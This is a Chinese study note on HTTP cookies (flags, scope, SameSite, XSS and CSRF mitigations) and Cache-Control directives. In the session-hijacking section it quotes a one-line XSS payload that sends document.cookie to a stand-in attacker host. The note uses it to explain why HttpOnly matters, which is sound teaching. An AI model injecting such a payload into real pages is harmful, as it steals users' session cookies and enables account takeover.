### Cookie,  Web Cookie或浏览器Cookie
* 服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie使基于无状态的HTTP协议记录稳定的状态信息成为了可能。
* 用途：会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）;个性化设置（如用户自定义设置、主题等）;浏览器行为跟踪.
* 分类：会话期Cookie和持久性Cookie。会话期Cookie关闭浏览器会自动删除失效 ；持久性Cookie可以指定一个特定的过期时间（Expires）或有效期（Max-Age。提示：当Cookie的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端。
response.setHeader('Set-Cookie', ['name=sea; max-age=2', 'year=2018; Expires=Wed, 21 Oct 2015 07:28:00 GMT;HttpOnly; domain=test.com']);
* 标记:  Secure 的Cookie只应通过被HTTPS协议加密过的请求发送给服务端 ;HttpOnly, 为避免跨域脚本 (XSS) 攻击, document.cookie无法访问带有 HttpOnly 标记的Cookie，它们只应该发送给服务端.
* Cookie的作用域: Domain 和 Path 标识定义了Cookie的作用域：即Cookie应该发送给哪些URL。Domain 标识指定了哪些主机可以接受Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了Domain，则一般包含子域名；Path 标识指定了主机下的哪些路径可以接受Cookie（该URL路径必须存在于请求URL中），以字符 %x2F ("/") 作为路径分隔符，子路径也会被匹配。
* SameSite Cookies： 允许服务器要求某个cookie在跨站请求时不会被发送，从而可以阻止跨站请求伪造攻击（CSRF）。但目前SameSite Cookie还处于实验阶段，并不是所有浏览器都支持。
* 会话劫持和XSS： 在Web应用中，Cookie常用来标记用户或授权会话。因此，如果Web应用的Cookie被窃取，可能导致授权用户的会话受到攻击。常用的窃取Cookie的方法有利用社会工程学攻击和利用应用程序漏洞进行XSS攻击。(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie。 HttpOnly类型的Cookie由于阻止了JavaScript对其的访问性而能在一定程度上缓解此类攻击。
* 跨站请求伪造（CSRF）: 对用户输入进行过滤来阻止XSS；任何敏感操作都需要确认；用于敏感信息的Cookie只能拥有较短的生命周期。 


### Cache-Control 缓存， 缓解服务器端压力，提升性能
> Cache-Control: private 私有缓存, public 公共缓存, no-cache 强制确认缓存, no-store 禁止进行缓存, must-revalidate 缓存验证确认, max-age=31536000 缓存（保持新鲜）的最大时间